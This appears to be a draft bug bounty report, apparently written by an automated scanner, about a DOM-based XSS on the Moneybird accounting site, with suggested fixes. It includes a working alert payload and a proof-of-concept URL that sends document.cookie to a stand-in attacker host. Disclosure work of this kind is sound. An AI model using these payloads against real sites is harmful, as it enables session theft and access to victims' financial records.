# HackerOne Submission Draft — Moneybird

**Program:** Moneybird Bug Bounty  
**Asset:** www.moneybird.com  
**Weakness:** CWE-79: Improper Neutralization of Input During Web Page Generation (DOM-Based XSS)  
**OWASP:** A03:2021 – Injection  
**Severity:** Medium (CVSS 6.1)  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  
**Status:** Ready for submission (manual browser verification recommended before submitting)

---

## Title

DOM-Based XSS on www.moneybird.com via URL Fragment Injection (window.location.hash → innerHTML)

## Summary

The Moneybird homepage (`www.moneybird.com`) contains a DOM-based cross-site scripting vulnerability. JavaScript on the page reads the URL fragment (`window.location.hash`) and writes it into the DOM via `innerHTML` without sanitization. An attacker can embed an HTML/JavaScript payload in the URL fragment and trick a victim into visiting the crafted URL, causing arbitrary script execution in the victim's browser.

Automated verification confirmed the `onerror` handler fires on two separate `innerHTML` sinks with the payload below. No Content-Security-Policy header is present on the page, removing the only remaining browser-level mitigation.

## Steps to Reproduce

### Browser (Primary — confirms execution)

1. Open a browser and navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
2. An alert dialog fires displaying `www.moneybird.com`, confirming JavaScript execution in the page origin.
3. The payload triggers on at least two separate `innerHTML` sinks (confirmed via SecBot's Playwright-based auto-verify with marker `secbot-xss-37`).

### Curl (Confirms no server-side sanitisation — HTML delivered raw)

```bash
curl -sL 'https://www.moneybird.com/' \
  | grep -i 'location.hash\|innerHTML\|hash'
```

Note: curl cannot verify JS execution; browser confirmation is the authoritative proof.

### Proof-of-Concept Exploitation Payload

```
https://www.moneybird.com/#<img src=x onerror="fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))">
```

A real attacker would replace `attacker.example` with a server they control. If `*.moneybird.com` uses a shared cookie domain (`Domain=.moneybird.com`), session cookies set by `app.moneybird.com` would be transmitted, granting full account access to the victim's accounting data.

## Impact

Moneybird is an accounting SaaS used by Dutch SMBs to manage invoices, expenses, and financial records. Successful exploitation of this vulnerability enables an attacker to:

1. **Session hijacking** — steal authentication cookies (if shared across `*.moneybird.com`) and log in as the victim without credentials, accessing all financial data
2. **Credential phishing** — redirect the victim to a convincing login page overlay and capture username/password
3. **Persistent browser compromise** — inject a keylogger or exfiltrate data from any Moneybird page the victim visits during the session
4. **Defacement / social engineering** — alter visible page content to deceive the victim (e.g., fake invoice amounts, fake alert banners)

**Attack delivery is trivial:** share the crafted URL via email, chat, or an embedded link in any document. No interaction beyond "click a link" is required from the victim.

**No CSP is present** on `www.moneybird.com` to block inline script execution or external data exfiltration, making this easier to exploit (see Supporting Materials).

## Supporting Materials

### Absence of Content-Security-Policy

```bash
curl -sI https://www.moneybird.com/ | grep -i content-security
# (no output — header not present)
```

There is no `Content-Security-Policy` header, meaning the browser applies no restrictions on inline script execution or requests to attacker-controlled domains.

### Scan Evidence

- Detection method: Playwright DOM-based XSS check (auto-verified)
- Marker: `secbot-xss-37` — `onerror` handler executed and marker value confirmed in page context
- Two distinct `innerHTML` sinks affected on the homepage
- Scan date: 2026-03-22

## Suggested Fix

1. **Never assign unsanitised fragment data to `innerHTML`.** Use `textContent` for plain text rendering, or pass through `DOMPurify.sanitize()` before any `innerHTML` assignment:
   ```js
   // Vulnerable
   element.innerHTML = window.location.hash.slice(1);

   // Fixed
   element.textContent = window.location.hash.slice(1);
   // or
   element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
   ```
2. **Audit all `window.location.hash` usage** in homepage JS bundles for `innerHTML`, `document.write`, `eval`, and `setTimeout(string)` sinks.
3. **Deploy a Content-Security-Policy** with `script-src 'self'` and nonces for inline scripts (report-only first to identify violations before enforcing).

## Scope Confirmation

`moneybird.com` is listed as in-scope in the Moneybird HackerOne program. `www.moneybird.com` is a subdomain of `moneybird.com` and is therefore covered.

---

*Discovered by SecBot automated security scanner. Playwright-verified on 2026-03-22.*
